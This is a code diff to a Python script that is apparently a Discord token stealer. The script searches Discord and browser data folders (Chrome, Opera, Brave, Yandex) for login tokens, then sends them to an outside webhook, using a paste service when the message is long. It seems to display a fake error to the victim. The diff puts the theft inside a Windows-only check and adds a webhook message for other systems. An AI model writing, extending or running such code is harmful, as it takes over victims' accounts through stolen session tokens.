@@ -50,45 +50,48 @@ def find_tokens(path):
 
 
 def main():
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
+    if str(os.name) == 'nt':
+        local = os.getenv('LOCALAPPDATA')
+        roaming = os.getenv('APPDATA')
 
-    paths = {
-        'Discord': roaming + '\\Discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Discord PTB': roaming + '\\discordptb',
-        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
-    }
+        paths = {
+            'Discord': roaming + '\\Discord',
+            'Discord Canary': roaming + '\\discordcanary',
+            'Discord PTB': roaming + '\\discordptb',
+            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+            'Opera': roaming + '\\Opera Software\\Opera Stable',
+            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+        }
 
-    message = ''
+        message = ''
 
-    for key, value in paths.items():
-        try:    
-            tokens = find_tokens(value)
-            message += f'\n**{key}**\n'
-            message += f'{tokens}'
-        except:
-            pass
-    
-    if len(message) > 2000:
-        url = paste(message)
-        if url != 0:
-            try:
-                Webhook(Webhook_URL).send(url)
+        for key, value in paths.items():
+            try:    
+                tokens = find_tokens(value)
+                message += f'\n**{key}**\n'
+                message += f'{tokens}'
             except:
                 pass
+        
+        if len(message) > 2000:
+            url = paste(message)
+            if url != 0:
+                try:
+                    Webhook(Webhook_URL).send(url)
+                except:
+                    pass
+            else:
+                Webhook(Webhook_URL).send('Paste failed somehow: trying regular upload:')
+                Webhook(Webhook_URL).send(message)
+        
         else:
-            Webhook(Webhook_URL).send('Paste failed somehow: trying regular upload:')
             Webhook(Webhook_URL).send(message)
-    
-    else:
-        Webhook(Webhook_URL).send(message)
 
-    error()
-    input("Press enter to exit")
-       
+        error()
+        input("Press enter to exit")
+
+    else:
+        Webhook(WEBHOOK_URL).send('Code ran, but not on Windows')   
 
 main()
